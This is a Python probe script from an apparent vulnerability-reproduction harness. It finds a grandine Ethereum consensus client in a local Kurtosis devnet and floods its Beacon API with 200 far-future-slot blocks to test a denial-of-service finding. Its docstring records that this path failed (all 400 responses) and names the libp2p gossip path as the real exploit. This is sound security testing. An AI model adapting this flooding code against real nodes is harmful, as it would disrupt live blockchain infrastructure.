"""grandine PROP-val-eth-003 — Beacon-API path probe (the NEGATIVE live result).

Floods far-future-slot BeaconBlocks at the CL's Beacon API. This path was
FALSIFIED live: grandine deserializes + version-validates the block (400)
before any future-slot buffering, so it never reaches validate_gossip_rules /
delayed_until_slot. The real exploit is the libp2p gossip path (verified by
source read; see findings_index code_review for PROP-val-eth-003).

Discovers a grandine CL in the `repro-grandine` enclave. Run:
`uv run python -m harness.probes.grandine_gossip_api`.
"""

from __future__ import annotations

import collections
import json
import re
import subprocess
import sys
import urllib.error
import urllib.request

from ..drivers.payloads import _encode_signed_block


def _discover_grandine_beacon_api(enclave: str = "repro-grandine") -> str | None:
    try:
        ids = subprocess.run(
            ["docker", "ps", "-q", "--filter", f"label=com.kurtosistech.enclave-name={enclave}"],
            capture_output=True, text=True, timeout=15,
        ).stdout.split()
        for cid in ids:
            label = subprocess.run(
                ["docker", "inspect", cid, "--format", '{{index .Config.Labels "com.kurtosistech.id"}}'],
                capture_output=True, text=True, timeout=15,
            ).stdout.strip()
            if label.startswith("cl-") and "grandine" in label:
                out = subprocess.run(["docker", "port", cid, "4000"],
                                     capture_output=True, text=True, timeout=15).stdout
                m = re.search(r":(\d+)$", out.strip().splitlines()[0])
                return f"http://127.0.0.1:{m.group(1)}"
    except Exception:
        return None
    return None


def probe(api: str, count: int = 200, slot_offset: int = 1_000_000):
    head = json.loads(urllib.request.urlopen(api + "/eth/v1/beacon/headers/head", timeout=5).read())
    cur = int(head["data"]["header"]["message"]["slot"])
    slot = cur + slot_offset
    codes = collections.Counter()
    for i in range(count):
        body = _encode_signed_block(slot, i.to_bytes(4, "little").ljust(32, b"\x00"))
        req = urllib.request.Request(api + "/eth/v1/beacon/blocks", data=body, method="POST",
                                     headers={"Content-Type": "application/octet-stream"})
        try:
            urllib.request.urlopen(req, timeout=5).read()
            codes["2xx"] += 1
        except urllib.error.HTTPError as e:
            codes[e.code] += 1
        except Exception as e:
            codes[type(e).__name__] += 1
    print(f"[PROP-val-eth-003 / API] {count} far-future blocks -> {dict(codes)}")
    print("  (all 400 = the API validates before buffering; the real path is libp2p gossip)")


if __name__ == "__main__":
    api = _discover_grandine_beacon_api()
    if api is None:
        print("no repro-grandine devnet (grandine CL); boot ethereum-package with cl_type: grandine")
        sys.exit(1)
    probe(api)
